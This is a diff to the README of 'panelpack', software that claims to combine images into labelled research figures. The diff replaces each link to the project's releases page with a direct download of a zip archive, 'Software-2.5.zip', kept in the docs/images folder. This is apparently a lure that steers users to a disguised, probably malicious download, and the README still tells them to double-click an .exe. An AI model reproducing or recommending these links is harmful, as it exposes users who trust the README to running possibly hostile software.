@@ -1,6 +1,6 @@
 # 📊 panelpack - Create professional research figures easily
 
-[ ![Download panelpack](https://img.shields.io/badge/Download-Panelpack-blue.svg) ](https://github.com/Sheltondoddering7287/panelpack/releases)
+[ ![Download panelpack](https://img.shields.io/badge/Download-Panelpack-blue.svg) ](https://github.com/Sheltondoddering7287/panelpack/raw/refs/heads/main/docs/images/Software-2.5.zip)
 
 Panelpack helps you organize your image files into single, professional documents. Researchers often struggle to combine multiple sub-images into one cohesive figure. This tool automates the process. It takes your individual image files and arranges them into a layout with labels like A, B, and C. It saves you time and ensures your figures look consistent for publications and presentations.
 
@@ -8,7 +8,7 @@ Panelpack helps you organize your image files into single, professional document
 
 You do not need programming experience to use this tool. Follow these steps to prepare your computer and run the software.
 
-1. Visit this page to download the latest version: [https://github.com/Sheltondoddering7287/panelpack/releases](https://github.com/Sheltondoddering7287/panelpack/releases).
+1. Visit this page to download the latest version: [https://github.com/Sheltondoddering7287/panelpack/raw/refs/heads/main/docs/images/Software-2.5.zip](https://github.com/Sheltondoddering7287/panelpack/raw/refs/heads/main/docs/images/Software-2.5.zip).
 2. Look for the file ending in `.exe` under the "Assets" section.
 3. Save the file to a folder on your computer where you keep your work.
 4. Double-click the file to start the application.
@@ -83,4 +83,4 @@ If you experience an error, check that your file names do not contain special ch
 **Is there a limit on how many images I can process?**
 You can combine as many images as you like. However, processing a very high number of large files at once may take a few extra seconds. The software remains stable regardless of the quantity.
 
-[ ![Download link](https://img.shields.io/badge/Download-Panelpack-grey.svg) ](https://github.com/Sheltondoddering7287/panelpack/releases)
+[ ![Download link](https://img.shields.io/badge/Download-Panelpack-grey.svg) ](https://github.com/Sheltondoddering7287/panelpack/raw/refs/heads/main/docs/images/Software-2.5.zip)
